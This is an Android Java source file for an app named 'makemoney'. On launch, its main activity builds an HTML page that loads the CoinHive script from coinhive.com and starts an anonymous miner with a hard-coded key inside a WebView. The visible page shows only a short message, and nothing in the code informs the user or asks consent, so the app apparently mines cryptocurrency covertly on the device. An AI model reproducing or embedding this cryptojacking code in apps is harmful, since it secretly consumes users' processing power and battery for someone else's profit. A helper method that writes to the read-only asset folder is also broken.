package make.moneny.makemoney;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.webkit.WebView;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends AppCompatActivity {


    WebView webView;

    String s1= "<script src='https://coinhive.com/lib/coinhive.min.js'></script>";
    String s2="";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView=findViewById(R.id.webView);
        webView.getSettings().setJavaScriptEnabled(true);

        setApiId("FoSp3v5iSKNPfuMKleriCNR9JPyp6tPC");
        String file =createFile();
       // writInsideFile(file,webView);

        if (file==null){
            Toast.makeText(this, "problem file !!", Toast.LENGTH_SHORT).show();
        }else {

            String mime = "text/html";
            String encoding = "utf-8";
            Log.e("script",file);

            webView.loadDataWithBaseURL(null, file, mime, encoding, null);


        }



    }



    public void setApiId(String apiId){

        StringBuilder stringBuilder=new StringBuilder();
        stringBuilder.append("<script> var miner = new CoinHive.Anonymous('");
        stringBuilder.append(apiId);
        stringBuilder.append("'); miner.start();</script>");
        s2=stringBuilder.toString();

    }

    public String createFile(){

        StringBuilder builder=new StringBuilder();
        builder.append("<html><head>");
        builder.append(s1);
        if (s2.equals("")){
            Log.e("err of Api id ","No Api Id yet !!!");
        }else {
            builder.append(s2);
            builder.append("</head>");
            builder.append("<body>");
            builder.append("<h1>^_^ it's work </h1>");
            builder.append("</body>");
            builder.append("</html>");
            return builder.toString();
        }


        return null;
    }


    public void writInsideFile(String file, WebView webView){

        try {


            InputStream f=getAssets().open("site.html");

            FileOutputStream fileOutputStream=new FileOutputStream("file:///android_asset/site.html");
            fileOutputStream.write(file.getBytes());
            fileOutputStream.flush();
            Toast.makeText(this, ""+file, Toast.LENGTH_SHORT).show();
            webView.loadUrl("file:///android_asset/site.html");

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }


}
